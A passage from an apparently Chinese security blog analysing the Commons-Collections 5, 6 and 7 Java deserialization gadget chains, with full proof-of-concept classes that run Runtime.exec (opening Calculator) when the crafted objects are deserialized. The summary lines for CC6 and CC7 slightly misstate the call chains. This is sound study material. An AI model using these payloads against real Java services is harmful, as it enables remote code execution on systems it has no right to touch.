利用上面两个前置知识的触发点，配合`LazyMap`就可以完成一条新的攻击路径，也就是`CommonsCollections5`链。

### POC-1

```java
package CommonsCollections5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 1:59 下午
 */
public class CommonsCollections5Gadge1 {

    public static void CC5() throws ClassNotFoundException, NoSuchFieldException, IOException, IllegalAccessException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry  tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("h3rmesk1t");
        Class _class = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = _class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            // 反序列化
            ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC5();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p0.ssl.qhimg.com/t01c9ad9512dbd5a0b8.png "undefined")

### POC-2

```java
package CommonsCollections5;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 2:47 下午
 */
public class CommonsCollections5Gadge2 {

    public static void CC5() throws CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class clazz = templates.getClass();
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("h3rmesk1t");
        Class _class = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = _class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(badAttributeValueExpException);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC5();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p3.ssl.qhimg.com/t01a2e64a59e190951a.png "undefined")

## 调用链

```java
BadAttributeValueExpException.readObject()
   TiedMapEntry.toString()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                    InvokerTransformer.transform()
```

## 总结
反序列化`BadAttributeValueExpException`调用`TiedMapEntry#toString`，间接调用了`LazyMap#get`，触发了后续的`Transformer`恶意执行链。

# CommonsCollections6链
## 环境搭建
1. `JDK`版本：JDK1.8u66(暂无限制)
2. `Commons-Collections`版本：3.1

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
### HashSet
`HashSet`是一个无序的、不允许有重复元素的集合，本质上就是由`HashMap`实现的，跟`HashMap`一样，都是一个存放链表的数组，`HashSet`中的元素都存放在`HashMap`的`key`上面，而`value`中的值都是统一的一个`private static final Object PRESENT = new Object();`，在`HashSet`的`readObject`方法中会调用其内部`HashMap`的`put`方法，将值放在`key`上。

![undefined](https://p4.ssl.qhimg.com/t0141e979ce4274e659.png "undefined")

## CommonsCollections6 分析
在`CommonsCollections5`中，通过对`TiedMapEntry#toString`方法的调用，触发了`TiedMapEntry#getValue`，继而触发了`LazyMap#get`来完成后半段的调用；而在`CommonsCollections6`中则是通过`TiedMapEntry#hashCode`触发对`TiedMapEntry#getValue`的调用，但是需要找到一个触发`hashcode()`方法的点，因此利用前置知识中的`HashSet()`方法来触发`hashCode()`方法。

在`HashSet#readObject`方法中，跟进`put()`方法，进入`java.util.HashMap`中调用`put()`方法，接着调用`hash()`方法，进而调用`key.hashCode()`，这里只需要让`key`为`TiedMapEntry`对象即可。

![undefined](https://p2.ssl.qhimg.com/t01ab6ef7b8fac67391.png "undefined")

![undefined](https://p2.ssl.qhimg.com/t0142489a93cadf6740.png "undefined")

但是在实际利用是需要解决一个问题，那就是在调用`put`方法的时候就触发命令执行的问题，P牛对此的解决方法是`outerMap.remove("h3rmesk1t");`，成功在反序列化的时候也触发了命令执行。

```java
package CommonsCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 4:38 下午
 */
public class FakeDemo {

    public static void fakeDemo() throws IOException, ClassNotFoundException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "d1no");
        map.remove("h3rmesk1t");

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(expMap);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            fakeDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p5.ssl.qhimg.com/t01dc922b774b94727c.png "undefined")

![undefined](https://p2.ssl.qhimg.com/t01afd9ba5636cd720a.png "undefined")

### POC
为了解决上述出现的问题，在构造`LazyMap`的时候先构造一个`fakeTransformers`对象，等最后⽣成`Payload`的时候，再利用反射将真正的`transformers`替换进去。

```java
package CommonsCollections6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 4:29 下午
 */
public class CommonsCollections6Gadget1 {

    public static void CC6() throws IllegalAccessException, NoSuchFieldException {
        Transformer[] fakeTransformers = new Transformer[] {};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);

        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, "h3rmesk1t");
        Map expMap = new HashMap();
        expMap.put(tiedMapEntry, "d1no");
        map.remove("h3rmesk1t");
        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        //map.clear();

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(expMap);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC6();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p1.ssl.qhimg.com/t01af36c3d9c1ae23de.png "undefined")

## 调用链

```java
HashSet.readObject()/HashMap.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                LazyMap.get()
                    ChainedTransformer.transform()
                        InvokerTransformer.transform()
```

## 总结
反序列化调用`TiedMapEntry`的`toString`方法，间接调用`LazyMap`的`hashCode`方法，触发了后续的`Transformer`恶意执行链。

# CommonsCollections7链
## 环境搭建
1. `JDK`版本：JDK1.8u66
2. `Commons-Collections`版本：3.1

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
### Hashtable
`Hashtable`与`HashMap`类似，都是是一种`key-value`形式的哈希表。

```java
[1] Hashtable 线程安全，HashMap 线程不安全
[2] HashMap 继承 AbstractMap，而 Hashtable 继承 Dictionary
[3] 两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现
[4] Hashtable 的 key-value 不允许为 null 值，但是 HashMap 则是允许的，后者会将 key=null 的实体放在 index=0 的位置
```

跟进`Hashtable`发现，在`readObject`方法中，会调用`reconstitutionPut()`方法，并在`reconstitutionPut()`方法中会调用`key.hashCode()`，后续的调用逻辑和`CommonsCollections6`链基本一致

![undefined](https://p3.ssl.qhimg.com/t01899b7a93969df1d4.png "undefined")

### 哈希碰撞机制
在[ProgrammerSought](https://www.programmersought.com/article/94401321514/)上给出的说法是：

```
The so-called hash conflict, that is, the two key values ​​are calculated by the hash function to obtain the same hash value, and a subscript can only store one key, which produces a hash conflict, if the subscript one of the keys first Saved, the other key must find its own storage location by other means.
```
也就是说，当两个不同的`key`通过`hash()`方法计算出同一个`hash`值时，而一个下标只能存储一个`key`，这就产生了`hash`冲突。

那么要如何构造出一个`hash`冲突呢，跟进`HashMap#hash`方法。

![undefined](https://p0.ssl.qhimg.com/t013442deb47d6d53a1.png "undefined")

继续跟进`hashcode()`方法，根据`for`循环中的代码，不难推出`Hash`值的计算公式

![undefined](https://p1.ssl.qhimg.com/t01175318d0f1bb428a.png "undefined")

![undefined](https://p5.ssl.qhimg.com/t01a092efcf9d7174fa.png "undefined")

这也就不难解释为什么`ysoserial`项目中的`CommonsCollections7`链中是`yy`和`zZ`了，需要时，利用`z3`来计算字符串位数不一样情况下的可能值即可。

```python
ord("y") == 121
ord("z") == 122
ord("Z") == 90
"yy".hashCode() == 31 × 121 + 1 × 121 == 3872
"zZ".hashCode() == 31 × 122 + 1 × 90 == 3872
"yy".hashCode() == "zZ".hashCode() == 3872
```


## CommonsCollections7 分析
在`CommonsCollections`链中，利用`AbstractMap#equals`来触发对`LazyMap#get`方法的调用，这里的`m`如果是可控的话，那么设置`m`为`LazyMap`，就可以完成后面的链子构造。

![undefined](https://p3.ssl.qhimg.com/t0134de4dd85bfb299e.png "undefined")

继续跟进看看`equals`方法的调用点在哪，在前面的`Hashtable#reconstitutionPut`方法中存在着调用点：`e.key.equals(key)`，如果这里的`key`可控的话，上面的`m`也就是可控的。

观察到在`readObject`方法中传递进去的`key`，相应的，那么在`writeObject`处也会存在`Hashtable#put`进入的值。

![undefined](https://p4.ssl.qhimg.com/t016ec33f3bae21b4df.png "undefined")

这里还需要注意一个点，由于`if`语句是用`&&`连接判断条件的，那么要执行到后面的`e.key.equals(key)`，就必须先要满足`e.hash == hash`，接着调用`equals`方法，这里利用到了`Hash`冲突(`Hash`碰撞)机制。

![undefined](https://p1.ssl.qhimg.com/t01000619073a2a405e.png "undefined")

在`POC`中移除第二个`LazyMap`中的元素是因为`get`方法向当前的`map`添加了新元素，从而`map2`变成了两个元素。

![undefined](https://p1.ssl.qhimg.com/t01027d17516a0d75fd.png "undefined")

## POC

```java
package CommonsCollections7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 6:40 下午
 */
public class CommonsCollections7Gadget {

    public static void CC7() throws NoSuchFieldException, IllegalAccessException {
        Transformer[] faketransformer = new Transformer[]{};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);

        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        Map map1 = LazyMap.decorate(hashMap1, chainedTransformer);
        map1.put("yy", 1);
        Map map2 = LazyMap.decorate(hashMap2, chainedTransformer);
        map2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
        Class _class = chainedTransformer.getClass();
        Field field = _class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        map2.remove("yy");

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(hashtable);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC7();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p2.ssl.qhimg.com/t01df39d6821b0c336f.png "undefined")

## 调用链

```java
Hashtable.readObject()
   TiedMapEntry.hashCode()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                    InvokerTransformer.transform()
```

## 总结
主体思想是用`Hashtable`代替`HashMap`触发`LazyMap`，后续利用与`CommonsCollections6`链的`HashMap`利用方式基本一致。

# 后言
本文从`Java`反射入手，逐步分析了`ysoserial`项目中的`URLDNS`链和`CommonsCollections1`到`CommonsCollections7`链，在实战中和`CTF`竞赛中往往需要对现有的链子进行改造，但是根本的思想还是类似的，由于自己在分析的过程中还有很多的不足以及不理解的地方，对于文章中的错误欢迎师傅们进行指正。